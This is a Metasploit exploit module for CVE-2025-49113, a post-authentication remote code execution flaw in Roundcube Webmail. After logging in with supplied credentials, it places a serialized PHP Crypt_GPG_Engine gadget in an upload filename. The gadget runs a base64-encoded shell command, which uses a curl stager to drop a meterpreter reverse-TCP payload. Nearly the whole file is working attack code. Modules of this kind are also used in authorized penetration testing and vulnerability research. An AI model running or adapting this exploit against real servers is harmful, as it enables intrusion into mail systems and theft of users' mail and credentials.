##
# This module requires Metasploit
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Roundcube â‰¤ 1.6.10 Post-Auth RCE via PHP Object Deserialization',
        'Description' => %q{
          Roundcube Webmail before 1.5.10 and 1.6.x before 1.6.11 allows remote code execution
          by authenticated users because the _from parameter in a URL is not validated
          in program/actions/settings/upload.php, leading to PHP Object Deserialization.

          An attacker can execute arbitrary system commands as the web server user.
        },
        'Author' => [ 'Maskim Rogov' ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2025-49113'],
          ['URL', 'https://www.cve.org/CVERecord?id=CVE-2025-49113']
        ],
        'Targets' => [
          [
            'Linux',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => ['curl'],
              'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' }
            }
          ],
          [
            'Windows',
            {
              'Platform' => 'win',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :windows_dropper,
              'CmdStagerFlavor' => ['curl'],
              'DefaultOptions' => { 'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp' }
            }
          ]
        ],
        'DisclosureDate' => '2025-06-02',
        'DefaultTarget' => 0
      )
      )

    register_options(
      [
        OptString.new('USERNAME', [ true, 'Email User to login with', '' ]),
        OptString.new('PASSWORD', [ true, 'Password to login with', '' ]),
        OptString.new('TARGETURI', [ true, 'The URI of the Roundcube Application', '/' ]),
        Opt::RPORT(9999)
      ]
    )
  end

  class PhpPayloadBuilder
    def initialize(command)
      @encoded = Base64.strict_encode64(command)
      @gpgconf = %(echo "#{@encoded}"|base64 -d|sh;#)
    end

    def build
      len = @gpgconf.bytesize
      %(|O:16:"Crypt_GPG_Engine":3:{s:8:"_process";b:0;s:8:"_gpgconf";s:#{len}:"#{@gpgconf}";s:8:"_homedir";s:0:"";};)
    end
  end

  def fetch_login_page
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET',
      'keep_cookies' => true,
      'vars_get' => { '_task' => 'login' }
    )

    fail_with(Failure::Unreachable, "#{peer} - No response from web service") unless res
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected HTTP code #{res.code}") unless res.code == 200
    res
  end

  def check
    res = fetch_login_page

    unless res.body =~ /"rcversion"\s*:\s*(\d+)/
      fail_with(Failure::UnexpectedReply, "#{peer} - Unable to extract version number")
    end

    version = Regexp.last_match(1)
    vprint_good("Extracted version: #{version}")

    vulnerable_versions = %w[
      10500 10501 10502 10503 10504 10505 10506 10507 10508 10509
      10600 10601 10602 10603 10604 10605 10606 10607 10608 10609 10610
    ]

    if vulnerable_versions.include?(version)
      return CheckCode::Appears
    end

    CheckCode::Safe
  end

  def exploit
    stager = generate_cmdstager(flavor: :curl, 'Path' => '/').join(';')
    payload_serialized = PhpPayloadBuilder.new(stager).build.gsub('"', '\\"')

    token = fetch_auth_token
    login(token)

    print_status('Uploading malicious payload...')
    upload_payload(payload_serialized)

    print_good('Exploit attempt complete. Check for session.')
  end

  def fetch_auth_token
    print_status('Fetching CSRF token...')
    res = fetch_login_page

    unless res.body =~ /name="_token" value="([^"]+)"/
      fail_with(Failure::UnexpectedReply, "#{peer} - Unable to extract CSRF token")
    end

    token = Regexp.last_match(1)
    vprint_good("Extracted token: #{token}")
    token
  end

  def login(token)
    print_status('Attempting login...')
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path),
      'method' => 'POST',
      'keep_cookies' => true,
      'vars_post' => {
        '_token' => token,
        '_task' => 'login',
        '_action' => 'login',
        '_url' => '_task=login',
        '_user' => datastore['USERNAME'],
        '_pass' => datastore['PASSWORD']
      },
      'vars_get' => { '_task' => 'login' }
    )

    fail_with(Failure::Unreachable, "#{peer} - No response during login") unless res
    fail_with(Failure::UnexpectedReply, "#{peer} - Login failed (code #{res.code})") unless res.code == 302

    print_good('Login successful.')
  end

  def upload_payload(payload_filename)
    png_data = Rex::Text.decode_base64('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAACklEQVR4nGMAAQAABQABDQottAAAAABJRU5ErkJggg==')
    boundary = Rex::Text.rand_text_alphanumeric(8)

    data = ''
    data << "--#{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"_file[]\"; filename=\"#{payload_filename}\"\r\n"
    data << "Content-Type: image/png\r\n\r\n"
    data << png_data
    data << "\r\n--#{boundary}--\r\n"

    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '?_task=settings&_framed=1&_remote=1&_from=edit-!xxx&_id=&_uploadid=upload123&_unlock=loading&_action=upload'),
      'ctype' => "multipart/form-data; boundary=#{boundary}",
      'data' => data
    }, 3)
  end
end
